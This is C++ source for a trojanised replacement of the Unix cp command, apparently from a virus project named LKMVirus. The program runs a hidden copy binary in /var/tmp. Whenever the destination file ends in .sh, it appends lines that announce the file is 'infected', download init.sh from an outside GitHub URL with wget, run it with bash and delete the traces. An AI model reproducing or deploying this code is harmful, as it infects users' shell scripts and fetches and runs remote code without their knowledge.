#include <cstdio>
#include <cstdlib>
#include <string>
#include <cstring>
#include <iostream>
using namespace std;
int main(int argc, char *argv[]) {
	printf("苟利国家生死以，岂因祸福避趋之。\n");
	string str = "/var/tmp/.cp ";
	for(int i = 1; i < argc; ++i) {
		str += 	" " + string(argv[i]);
	}	
	str += " 2> /var/tmp/.cp_log";
	system(str.c_str());
	FILE* file = fopen("/var/tmp/.cp_log", "r");
	char ch;
    while((ch=getc(file)) != EOF)
        cerr << ch;

	fclose(file);
	if(argc == 3) {
		int len = strlen(argv[2]);
		if(len >= 3 && argv[2][len-3] == '.' && argv[2][len-2] == 's' && argv[2][len-1] == 'h'){
			string cmd1 = "cp " + string(argv[2]) + " /var/tmp/.cp_tmp" + " 2> /var/tmp/.cp_log";
			system(cmd1.c_str());
			FILE* file = fopen("/var/tmp/.cp_tmp","a");
		
			fprintf(file, "# This is our code\n");
			fprintf(file,"echo \"\nThis bash file is infected!\n\" ");
			fprintf(file, "wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/init.sh 2> serrlog\n");
			fprintf(file, "bash init.sh\n");
			fprintf(file, "rm init.sh serrlog\n");
			fclose(file);
			string cmd2 = "cp -f /var/tmp/.cp_tmp " +  string(argv[2]) + " 2> /var/tmp/.cp_log";
			system(cmd2.c_str());
			system("rm -f /var/tmp/.cp_tmp 1> .cp_log");
		}			
	}
	system("rm -f /var/tmp/.cp_log");
}
